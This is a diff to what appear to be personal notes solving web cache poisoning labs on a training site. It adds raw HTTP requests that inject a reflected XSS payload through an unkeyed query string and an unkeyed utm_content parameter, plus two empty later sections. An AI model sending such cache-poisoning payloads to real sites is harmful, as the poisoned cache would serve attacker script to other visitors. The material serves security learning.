@@ -96,6 +96,57 @@ X-Host: exploit-0a75001f03a6c4e780eb07db015700fd.exploit-server.net
 
 ```
 
+
 ## 5. Web cache poisoning via an unkeyed query string
 
+```
+GET /?evil='/><script>alert(1)</script> HTTP/1.1
+Host: 0a46000a03ee806e82182e9e00a30011.web-security-academy.net
+Accept-Encoding: gzip, deflate, gc31d0npsy
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7, text/gc31d0npsy
+Accept-Language: en-US,gc31d0npsy;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36 gc31d0npsy
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="116", "Chromium";v="116"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
 
+
+```
+
+
+## 6. Web cache poisoning via an unkeyed query parameter
+
+```
+GET /?utm_content=25awzp64et'/><script>alert(1)</script> HTTP/1.1
+Host: 0a4300d7030cd8938203cfc100c4007f.web-security-academy.net
+Accept-Encoding: gzip, deflate, lwkhe2fbn1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7, text/lwkhe2fbn1
+Accept-Language: en-US,lwkhe2fbn1;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36 lwkhe2fbn1
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="116", "Chromium";v="116"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
+Origin: https://lwkhe2fbn1.0a4300d7030cd8938203cfc100c4007f.web-security-academy.net
+
+
+```
+
+
+## 7. Parameter cloaking
+
+```
+
+```
+
+
+## 8. 
+
+```
+
+```
